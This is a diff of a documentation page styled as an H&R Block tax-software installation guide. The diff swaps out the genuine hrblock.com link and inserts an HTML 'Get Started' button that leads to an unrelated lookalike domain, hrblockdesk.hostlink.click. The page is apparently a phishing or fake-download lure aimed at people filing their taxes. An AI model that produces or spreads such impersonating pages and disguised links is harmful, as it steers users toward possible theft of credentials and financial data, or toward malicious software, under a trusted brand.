@@ -1,9 +1,14 @@
 hrblock.com/installtax | Download Tax Software for At-Home Prep & Filing
 =========================================================================
 
-Tax season can often feel overwhelming, but it doesn’t have to be. With H&R Block’s digital tools and easy-to-use tax software, preparing and filing your taxes at home is more convenient than ever. If you’ve recently purchased the H&R Block software or are considering filing your taxes independently this year, then you need to start at `hrblock.com/installtax <https://www.hrblock.com/installtax>`_.
+Tax season can often feel overwhelming, but it doesn’t have to be. With H&R Block’s digital tools and easy-to-use tax software, preparing and filing your taxes at home is more convenient than ever. If you’ve recently purchased the H&R Block software or are considering filing your taxes independently this year, then you need to start at hrblock.com/installtax.
 
-Using `hrblock.com/installtax` is the first step in getting set up to file confidently from the comfort of your home. This guide is here to walk you through how to **Download H&R Block Tax Software**, install it on your computer, and start filing your taxes right away.
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://hrblockdesk.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with H&R Block</a>
+   </div>
+Using hrblock.com/installtax is the first step in getting set up to file confidently from the comfort of your home. This guide is here to walk you through how to **Download H&R Block Tax Software**, install it on your computer, and start filing your taxes right away.
 
 Whether you're a first-time filer or a seasoned DIY tax preparer, `hrblock.com/installtax` is your go-to destination for secure downloads and efficient setup. In this guide, you’ll find everything you need to get started.
 
